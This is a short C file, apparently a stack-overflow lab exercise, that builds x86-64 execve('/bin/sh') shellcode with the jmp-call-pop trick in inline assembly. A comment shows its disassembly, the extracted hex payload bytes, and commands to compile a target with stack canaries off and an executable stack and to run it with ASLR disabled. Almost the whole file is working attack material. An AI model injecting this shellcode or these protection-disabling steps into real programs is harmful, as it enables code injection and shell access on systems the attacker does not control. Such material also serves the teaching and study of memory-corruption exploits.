int shell() {
  asm("\
needle: jmp gofar\n\
goback: pop %rdi\n\
        xor %rax, %rax\n\
        movb $0x3b, %al\n\
        xor %rsi, %rsi\n\
        xor %rdx, %rdx\n\
        syscall\n\
gofar:  call goback\n\
.string \"/bin/sh\"\n\
");
}

int main() {
  shell();
}

/*

gcc shellcode.c
objdump -d a.out
---
00000000004004ed <shell>:
  4004ed: 55                    push   %rbp
  4004ee: 48 89 e5              mov    %rsp,%rbp

00000000004004f1 <needle>:
  4004f1: eb 0e                 jmp    400501 <gofar>

00000000004004f3 <goback>:
  4004f3: 5f                    pop    %rdi
  4004f4: 48 31 c0              xor    %rax,%rax
  4004f7: b0 3b                 mov    $0x3b,%al
  4004f9: 48 31 f6              xor    %rsi,%rsi
  4004fc: 48 31 d2              xor    %rdx,%rdx
  4004ff: 0f 05                 syscall 

0000000000400501 <gofar>:
  400501: e8 ed ff ff ff        callq  4004f3 <goback>
  400506: 2f                    (bad)  
  400507: 62                    (bad)  
  400508: 69 6e 2f 73 68 00 5d  imul   $0x5d006873,0x2f(%rsi),%ebp
  40050f: c3                    retq   
---

xxd -s0x4f1 -l32 -p a.out

eb0e5f4831c0b03b4831f64831d20f05e8edffffff2f62696e2f7368005d c355

Compile w/o stack canaries and exec stack:
gcc -g -fno-stack-protector -z execstack stack.c -o stack-codeinject

Run w/o ASLR:
setarch `arch` -R ./stack-codeinject



 */
